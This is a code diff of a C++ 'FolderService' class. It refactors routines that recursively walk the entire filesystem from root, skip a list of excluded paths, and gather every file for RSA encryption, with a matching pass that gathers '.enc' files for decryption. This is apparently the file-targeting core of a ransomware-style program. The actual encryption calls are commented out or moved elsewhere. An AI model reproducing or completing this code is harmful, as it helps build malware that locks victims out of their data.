@@ -37,27 +37,33 @@ FolderService::FolderService() {
     m_exclude_paths.push_back(".enc");
 }
 
-void FolderService::list_files_and_encrypt(RSAEncryptor* encrytpor) {
+std::vector<std::string> FolderService::list_files_for_encryption() {
+    m_data_files.clear();
     boost::filesystem::path root("/");
 
     for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
         if (boost::filesystem::is_directory(it->path())) {
-            list_files_in_directory_and_encrypt(it->path(), encrytpor);
+            list_files_in_directory_for_encryption(it->path());
         }
     }
+
+    return get_data_files();
 }
 
-void FolderService::list_files_and_decrypt(RSAEncryptor* encrytpor, std::string key) {
+std::vector<std::string> FolderService::list_files_for_decryption() {
+    m_data_files.clear();
     boost::filesystem::path root("/");
 
     for (boost::filesystem::directory_iterator it(root); it != boost::filesystem::directory_iterator(); ++it) {
         if (boost::filesystem::is_directory(it->path())) {
-            list_files_in_directory_and_decrypt(it->path(), encrytpor, key);
+            list_files_in_directory_for_decryption(it->path());
         }
     }
+
+    return get_data_files();
 }
 
-void FolderService::list_files_in_directory_and_encrypt(boost::filesystem::path directory, RSAEncryptor* encrytpor) {
+void FolderService::list_files_in_directory_for_encryption(boost::filesystem::path directory) {
     try {
         for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
             std::string path = it->path().string();
@@ -73,11 +79,10 @@ void FolderService::list_files_in_directory_and_encrypt(boost::filesystem::path 
 
             if (!exclude) {
                 if (boost::filesystem::is_regular_file(it->path())) {
-                    std::string encFilePath = path; // encrytpor->encryptFile(it->path());
-                    std::cout<<"[Encrypted file]: "<<encFilePath<<std::endl;
-                    m_data_files.push_back(encFilePath);
+                    std::cout<<"[Encrypted file]: "<<path<<std::endl;
+                    m_data_files.push_back(path);
                 } else if (boost::filesystem::is_directory(it->path())) {
-                    list_files_in_directory_and_encrypt(it->path(), encrytpor);
+                    list_files_in_directory_for_encryption(it->path());
                 }
             } else {
                 std::cout<<"[Excluded file/Repo]: "<<path<<std::endl;
@@ -88,18 +93,17 @@ void FolderService::list_files_in_directory_and_encrypt(boost::filesystem::path 
     }
 }
 
-void FolderService::list_files_in_directory_and_decrypt(boost::filesystem::path directory, RSAEncryptor* decryptor, std::string key) {
+void FolderService::list_files_in_directory_for_decryption(boost::filesystem::path directory) {
     try {
         for (boost::filesystem::directory_iterator it(directory); it != boost::filesystem::directory_iterator(); ++it) {
                 if (boost::filesystem::is_regular_file(it->path())) {
                     std::string path = it->path().string();
-                    /*if(path.find(".enc") != std::string::npos) {
-                        std::string decFilePath = decryptor->decryptFile(it->path(), key);
-                        std::cout<<"[Decrypted file]: "<<decFilePath<<std::endl;
-                    }*/
-                    std::cout<<"[Decrypted file]: "<<path<<std::endl;
+                    if(path.find(".enc") != std::string::npos) {
+                        m_data_files.push_back(path);
+                        std::cout<<"[Decrypted file]: "<<path<<std::endl;
+                    }
                 } else if (boost::filesystem::is_directory(it->path())) {
-                    list_files_in_directory_and_decrypt(it->path(), decryptor, key);
+                    list_files_in_directory_for_decryption(it->path());
                 }
         }
     } catch (const boost::filesystem::filesystem_error& e) {
